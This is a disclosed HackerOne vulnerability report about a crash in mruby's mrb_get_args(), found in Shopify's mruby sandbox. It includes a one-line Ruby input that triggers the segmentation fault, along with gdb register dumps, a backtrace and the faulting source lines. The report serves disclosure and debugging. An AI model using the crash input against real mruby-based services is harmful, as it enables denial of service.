# SIGSEGV on mruby mrb_get_args() 

## Report Details
- **Report ID**: 191938
- **URL**: https://hackerone.com/reports/191938
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-17T12:58:18.757Z
- **Disclosed**: 2017-02-10T21:54:59.154Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
There is invalid memory read on mruby when calling to mrb_get_args() with invalid RArray which causes a SIGSEGV to denial of service.

The following code triggers the bug (attached as mrb_get_args.rb):

    l [],y(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

Crash
---------------------
Here we can see the crash (full crash output attached)

    root@x:/home/x/Desktop/research/shopify/mruby-engine/bin# ./sandbox mrb_get_args.rb 
    ./sandbox:20: [BUG] Segmentation fault at 0x00015500000026
    ruby 2.2.5p319 (2016-04-26 revision 54774) [x86_64-linux-gnu]

    -- Control frame information -----------------------------------------------
    c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
    c:0002 p:0186 s:0005 E:0002d8 EVAL   ./sandbox:20 [FINISH]
    c:0001 p:0000 s:0002 E:001f00 TOP    [FINISH]

    -- Ruby level backtrace information ----------------------------------------
    ./sandbox:20:in `<main>'
    ./sandbox:20:in `sandbox_eval'

    -- Machine register context ------------------------------------------------
     RIP: 0x00007f54e770d48c RBP: 0x00007f54e6281cb0 RSP: 0x00007f54e62788c0
     RAX: 0x000001550000000e RBX: 0x00007f54e7775467 RCX: 0x00007f54e62789b0
     RDX: 0x00007f54e628cf80 RDI: 0x00007f54e6278930 RSI: 0x00007f54e7775467
      R8: 0x00007f54e62789b8  R9: 0x0000000000000000 R10: 0x00007f54e627a4e0
     R11: 0x0000000000000000 R12: 0x00007f54e6286780 R13: 0x00007f54e6286a00
     R14: 0x00000000ffffffff R15: 0x00007f54e627a4e0 EFL: 0x0000000000010286

    -- C level backtrace information -------------------------------------------
    /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f54ebdfb875]
    /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f54ebdfbaac]
    /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f54ebcd80cb]
    /usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f54ebd8e0ce]
    /lib/x86_64-linux-gnu/libc.so.6 [0x7f54eb8d9cb0]

Crash Debug
---------------------

    (gdb) r sandbox tmin_sample_2-0 
    Starting program: /usr/bin/ruby sandbox mrb_get_args.rb
    warning: the debug information found in "/lib64/ld-2.19.so" does not match "/lib64/ld-linux-x86-64.so.2"     (CRC mismatch).

    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    [New Thread 0x7ffff7ff5700 (LWP 8477)]
    [New Thread 0x7ffff1f6e700 (LWP 8642)]

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7ffff1f6e700 (LWP 8642)]
    0x00007ffff340248c in mrb_get_args (mrb=mrb@entry=0x7ffff1f6f4e0, format=format@entry=0x7ffff346a467 "n*")
        at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/class.c:523
    523	    argc = a->len;
    (gdb) info reg
    rax            0x1550000000e	1464583847950
    rbx            0x7ffff346a467	140737274881127
    rcx            0x7ffff1f6d9b0	140737252874672
    rdx            0x7ffff1f81f80	140737252958080
    rsi            0x7ffff346a467	140737274881127
    rdi            0x7ffff1f6d930	140737252874544
    rbp            0x7ffff1f76cb0	0x7ffff1f76cb0
    rsp            0x7ffff1f6d8c0	0x7ffff1f6d8c0
    r8             0x7ffff1f6d9b8	140737252874680
    r9             0x0	0
    r10            0x7ffff1f6f4e0	140737252881632
    r11            0x0	0
    r12            0x7ffff1f7b780	140737252931456
    r13            0x7ffff1f7ba00	140737252932096
    r14            0xffffffff	4294967295
    r15            0x7ffff1f6f4e0	140737252881632
    rip            0x7ffff340248c	0x7ffff340248c <mrb_get_args+4028>
    eflags         0x10286	[ PF SF IF RF ]
    cs             0x33	51
    ss             0x2b	43
    ds             0x0	0
    es             0x0	0
    fs             0x0	0
    gs             0x0	0
    (gdb) list *$rip
    0x7ffff340248c is in mrb_get_args (/home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/class.c:523).
    518	
    519	  va_start(ap, format);
    520	  if (argc < 0) {
    521	    struct RArray *a = mrb_ary_ptr(mrb->c->stack[1]);
    522	
    523	    argc = a->len;
    524	    array_argv = TRUE;
    525	  } else {
    526	    array_argv = FALSE;
    527	  }

Bactrace
---------------------
    (gdb) bt
     #0  0x00007ffff340248c in mrb_get_args (mrb=mrb@entry=0x7ffff1f6f4e0,     format=format@entry=0x7ffff346a467 "n*")
    at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/class.c:523
     #1  0x00007ffff3404979 in mrb_bob_missing (mrb=0x7ffff1f6f4e0, mod=...)
    at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/class.c:1521
     #2  0x00007ffff33ec183 in mrb_vm_exec (mrb=mrb@entry=0x7ffff1f6f4e0, proc=<optimized out>, proc@entry=0x7ffff1f77130, pc=0x7ffff1fced94)
    at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1169
     #3  0x00007ffff33f26bc in mrb_vm_run (mrb=0x7ffff1f6f4e0, proc=0x7ffff1f77130, self=..., stack_keep=stack_keep@entry=0)
    at /home/x/Desktop/shopify/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:770
     #4  0x00007ffff33da2ee in mruby_engine_monitored_eval (data=0x7ffff1f6f3e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
     #5  0x00007ffff7382184 in start_thread (arg=0x7ffff1f6e700) at pthread_create.c:312
     #6  0x00007ffff769237d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

The crash happens at mruby-engine/ext/mruby_engine/mruby/src/class.c:523 which is built inline

    if (argc < 0) {
        struct RArray *a = mrb_ary_ptr(mrb->c->stack[1]);
        argc = a->len;  // Bug happens here
        array_argv = TRUE;
    } else {
        array_argv = FALSE;
    }

Impact
---------------------
Its impact seems to be DoS of the service running the sandbox service.

## Attachments
- mrb_get_args.rb
- sandbox.log
